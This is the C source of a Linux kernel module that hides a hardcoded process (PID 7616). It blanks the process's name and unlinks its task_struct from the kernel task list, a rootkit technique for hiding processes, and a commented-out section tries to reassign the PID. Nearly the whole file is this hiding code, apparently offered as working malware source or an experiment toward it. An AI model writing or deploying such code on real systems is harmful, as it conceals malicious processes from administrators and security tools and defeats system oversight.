#include <linux/module.h>
#include <linux/printk.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <net/sock.h>
#include <linux/proc_fs.h>
#include <linux/pid_namespace.h>
#include <linux/ptrace.h>
#include <linux/pid.h>
// #include <linux/pidfs.h>

#define HIDEPID 7616


extern struct pid* alloc_pid(struct pid_namespace *, pid_t*, size_t);

int hide_pid(void);




int init_module(void)
{
    hide_pid();
    return 0;
}




int hide_pid(void)
{

#define NEWPID 65535

    struct list_head* pos = NULL;
    struct task_struct *task = NULL, *elected_task = NULL, *task_prev = NULL, *task_next = NULL;
    struct pid* newpid = NULL;
    char new_comm[16] = {0};
    struct hlist_head **ppid_hash = NULL;
    struct hlist_head *pid_hash = NULL;
    struct hlist_head *phlist = NULL;
    unsigned int *ppidhash_shift = NULL;
    unsigned int pidhash_size = 0;
    unsigned int pidhash_idx = 0;
    struct upid* pupid = NULL;
    struct hlist_node** toremove = NULL;
    unsigned int toremove_cnt = 0, toremove_idx = 0;

    int target_pid = HIDEPID;

    printk(KERN_INFO "Target PID is %d", target_pid);
    list_for_each(pos, &current->tasks) {

        task = list_entry(pos, struct task_struct, tasks); 
        if(task->pid == target_pid) {
            elected_task = task;
        }
    }

    if(elected_task!=NULL) {

        printk(KERN_INFO "Process id is %d", elected_task->pid);

        task_next = list_entry(elected_task->tasks.next, struct task_struct, tasks);
        task_prev = list_entry(elected_task->tasks.prev, struct task_struct, tasks);
        printk(KERN_INFO "Next process is %s", task_next->comm);
        printk(KERN_INFO "Prev process is %s", task_prev->comm);

        memcpy(elected_task->comm, new_comm, 16);
    
        task_prev->tasks.next = elected_task->tasks.next;
        task_next->tasks.prev = elected_task->tasks.prev;

        elected_task->tasks.next = &(elected_task->tasks);
        elected_task->tasks.prev = &(elected_task->tasks);

        
        /* Change PID */
        // pid_t new_pid = NEWPID;
        // struct pid_namespace* ns = task_active_pid_ns(elected_task);
        // newpid = alloc_pid(ns, &new_pid, sizeof(pid_t));
        // newpid->numbers[0].nr = NEWPID;
        // // change_pid(elected_task, PIDTYPE_PID, newpid);
        // elected_task->pid = NEWPID;

        
    }

    return 0;
}


void cleanup_module(void)
{
    printk(KERN_INFO "Finish work\n");
}


MODULE_LICENSE("GPL");
